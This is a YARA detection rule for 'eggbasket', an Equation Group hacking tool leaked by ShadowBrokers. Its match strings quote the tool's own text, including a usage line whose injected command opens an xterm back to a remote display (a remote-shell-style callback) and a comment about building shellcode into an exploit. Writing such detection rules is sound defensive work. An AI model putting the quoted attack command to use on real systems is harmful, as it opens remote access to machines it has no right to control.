rule EquationGroup_eggbasket_RID3070 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}